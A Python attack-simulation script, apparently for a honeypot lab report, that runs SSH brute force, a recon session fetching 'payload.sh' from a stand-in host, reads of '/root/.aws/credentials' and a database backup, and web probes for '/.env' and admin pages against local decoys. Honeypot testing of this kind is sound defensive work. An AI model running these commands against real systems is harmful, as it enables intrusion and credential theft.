"""Scripted attacks against YOUR OWN lab decoys (no Kali needed).

    pip install paramiko httpx
    python attacker/attack_sim.py all        # or one scenario name

Scenarios: brute_force, recon_download, data_theft, web_probe.
Prints timings so you can fill in the evaluation table of your report.
"""
import os
import sys
import time

import httpx
import paramiko

SSH_HOST = os.getenv("SSH_HOST", "127.0.0.1")
SSH_PORT = int(os.getenv("SSH_PORT", "2222"))
WEB_HOST = os.getenv("WEB_HOST", "127.0.0.1")
WEB_PORT = int(os.getenv("WEB_PORT", "8080"))


def ssh_connect(user, password):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(SSH_HOST, port=SSH_PORT, username=user, password=password,
              timeout=8, allow_agent=False, look_for_keys=False)
    return c


def run_shell(client, commands):
    """Use an interactive shell so the whole session is one connection."""
    chan = client.invoke_shell()
    time.sleep(1)
    for cmd in commands:
        chan.send(cmd + "\n")
        time.sleep(1)
    chan.close()


def brute_force():
    for pw in ["123456", "password", "admin", "letmein"]:
        try:
            ssh_connect("root", pw).close()
        except paramiko.AuthenticationException:
            pass
        time.sleep(0.5)
    # By now the decoy has adapted and accepts the next login.
    run_shell(ssh_connect("root", "toor"), ["whoami"])


def recon_download():
    run_shell(ssh_connect("root", "toor"), [
        "whoami", "uname -a", "ls /", "find /tmp -type f",
        "wget http://example.invalid/payload.sh", "chmod +x payload.sh"])


def data_theft():
    run_shell(ssh_connect("admin", "admin"), [
        "ls /home/admin", "cat /home/admin/backup_db.sql",
        "cat /root/.aws/credentials", "ls /var/backups"])


def web_probe():
    base = f"http://{WEB_HOST}:{WEB_PORT}"
    for path in ["/", "/admin", "/wp-login.php", "/.env", "/phpmyadmin"]:
        httpx.get(base + path, timeout=5)
    httpx.post(base + "/login", timeout=5,
               data={"username": "admin", "password": "admin123"})


SCENARIOS = {"brute_force": brute_force, "recon_download": recon_download,
             "data_theft": data_theft, "web_probe": web_probe}

if __name__ == "__main__":
    wanted = sys.argv[1] if len(sys.argv) > 1 else "all"
    for name, fn in SCENARIOS.items():
        if wanted in ("all", name):
            print("running", name)
            start = time.time()
            try:
                fn()
            except Exception as exc:
                print("  error:", exc)
            print(f"  finished in {time.time() - start:.1f}s")
